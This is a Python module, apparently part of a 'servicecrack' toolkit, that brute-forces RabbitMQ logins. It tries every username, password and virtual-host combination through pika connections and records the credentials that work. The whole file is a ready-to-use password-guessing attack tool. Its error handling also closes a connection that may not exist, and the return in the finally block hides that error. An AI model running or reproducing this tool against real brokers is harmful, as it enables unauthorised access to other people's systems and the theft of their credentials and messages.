# coding: utf-8
import pika

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("rabbitmq")

service_name = "rabbitmq"


class RabbitmqCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords, virtual_hosts=["/"]):
        self.virtual_hosts = virtual_hosts
        super(RabbitmqCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 5672

    def run(self):
        logging.info("start crack {}:{}".format(self.host, self.port))
        for virtual_host in self.virtual_hosts:
            for username in self.usernames:
                for password in self.passwords:
                    self.crack(username, password, virtual_host)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password, virtual_host):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            credentials = pika.PlainCredentials(username, password)
            conn = pika.BlockingConnection(pika.ConnectionParameters(host=self.host, port=self.port, virtual_host=virtual_host, credentials=credentials, blocked_connection_timeout=self.timeout))
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close()
        finally:
            if not success:
                return
            conn.close()
            self.result.append({"username": username, "password": password, "virtual_host": virtual_host})



